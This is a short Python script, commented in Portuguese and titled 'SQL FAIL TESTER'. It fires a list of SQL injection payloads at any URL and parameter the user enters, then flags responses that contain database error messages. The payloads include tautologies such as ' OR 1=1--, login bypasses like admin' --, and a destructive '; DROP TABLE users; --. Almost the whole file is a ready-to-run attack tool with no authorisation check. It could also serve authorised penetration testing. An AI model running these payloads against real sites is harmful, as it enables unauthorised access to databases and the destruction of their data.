import requests

# Logo ASCII personalizada
logo = r"""
  /$$$$$$            /$$
 /$$__  $$          | $$
| $$  \__/  /$$$$$$ | $$
|  $$$$$$  /$$__  $$| $$
 \____  $$| $$  \ $$| $$
 /$$  \ $$| $$  | $$| $$
|  $$$$$$/|  $$$$$$$| $$
 \______/  \____  $$|__/
               | $$    
               | $$    
               |__/     

🧪 SQL FAIL TESTER
"""

# Payloads SQL comuns para testes de injeção
payloads = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' OR ''='",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
]

# Strings de erro comuns em bancos de dados
erros_sql = [
    "you have an error in your sql syntax;",
    "warning: mysql_",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "ora-01756",
    "pdoexception",
    "sqlstate",
    "fatal error",
]

def testa_payloads(url, parametro, metodo):
    print(f"\n[+] Testando {len(payloads)} payloads em {url} usando método {metodo.upper()}...\n")
    for payload in payloads:
        try:
            if metodo == "GET":
                resposta = requests.get(url, params={parametro: payload}, timeout=10)
            else:
                resposta = requests.post(url, data={parametro: payload}, timeout=10)

            texto_resposta = resposta.text.lower()
            for erro in erros_sql:
                if erro in texto_resposta:
                    print(f"[!] VULNERABILIDADE POSSÍVEL DETECTADA!")
                    print(f"    Payload: {payload}")
                    print(f"    Erro encontrado: {erro}\n")
                    break
            else:
                print(f"[-] Sem erro com payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Erro ao conectar com {url}: {e}")

# Entrada de dados do usuário
def main():
    print(logo)
    print("Digite as informações da URL para iniciar o teste.\n")
    url = input("URL alvo (ex: http://site.com/pagina.php): ").strip()
    parametro = input("Parâmetro a ser testado (ex: id): ").strip()
    metodo = input("Método HTTP (GET ou POST): ").strip().upper()

    if metodo not in ["GET", "POST"]:
        print("Método inválido. Use GET ou POST.")
        return

    testa_payloads(url, parametro, metodo)

if __name__ == "__main__":
    main()